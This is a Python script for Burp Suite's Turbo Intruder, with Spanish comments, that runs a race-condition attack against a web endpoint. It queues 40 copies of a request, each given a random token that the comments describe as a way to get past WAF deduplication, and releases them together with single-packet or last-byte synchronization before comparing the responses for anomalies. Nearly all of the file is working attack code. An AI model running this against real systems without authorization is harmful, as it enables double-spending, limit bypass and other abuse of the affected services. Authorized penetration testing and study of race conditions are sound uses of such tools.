import secrets
import time

def queueRequests(target, wordlist):
    # Intentamos Engine.HTTP2 para el Single-Packet Attack (Precisión Atómica)
    # Si el servidor no lo soporta, Burp bajará a HTTP/1.1 (Last-Byte Sync) automáticamente.
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False,
                           engine=Engine.HTTP2
                           )

    # Configuraciones del ataque
    MARKER = "RACE_CONDITION"
    RACE_SIZE = 40 # Cantidad de peticiones en la ráfaga
    
    # Pre-encolamos las peticiones para que los encabezados ya estén en el buffer del servidor
    for i in range(RACE_SIZE):
        # Generamos un token hexadecimal limpio (Seguro contra Format String)
        # Esto asegura que cada petición sea tratada como "única" por el WAF
        token = secrets.token_hex(4)
        
        # Sustitución universal del marcador
        mod_req = target.req.replace(MARKER, token)
        
        # Encolamos bajo la compuerta 'atomic_race'
        engine.queue(mod_req, gate='atomic_race')

    # DISPARO SINCRONIZADO: Libera el último bit de todas las peticiones a la vez
    engine.openGate('atomic_race')

def handleResponse(req, interesting):
    # En la tabla de resultados, buscamos anomalías.
    # El script añadirá automáticamente columnas de Status, Length y Time (Latencia).
    # SI ves variaciones en Length o Status entre peticiones idénticas, hay RACE CONDITION.
    table.add(req)
